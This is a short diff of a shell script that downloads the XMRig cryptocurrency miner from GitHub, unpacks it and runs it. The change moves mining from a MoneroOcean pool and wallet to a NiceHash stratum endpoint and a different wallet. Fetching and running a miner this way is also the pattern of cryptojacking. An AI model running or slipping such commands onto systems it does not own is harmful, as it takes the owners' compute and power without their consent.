@@ -3,4 +3,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux
 tar -xvzf xmrig-6.12.1-linux-x64.tar.gz
 cd xmrig-6.12.1
 chmod u+x ./xmrig
-./xmrig --coin=XMR -o gulf.moneroocean.stream:10128 -u 41wkbeDzzVrcXH2Vo9fn8ZhVrW4dHnZd3CHzK3Dmons7hViwLgk8U1tPW2DyNrLaKKep65gyey6QtC3f8r6yxL9qPeYmPTB -p x -k
+./xmrig --donate-level=1 -o stratum+tcp://randomxmonero.eu-north.nicehash.com:3380 -u 32VAJNALRLp72Aeg5BgWhe85yabXZ9pXHn -k --nicehash -a randomx --coin=monero
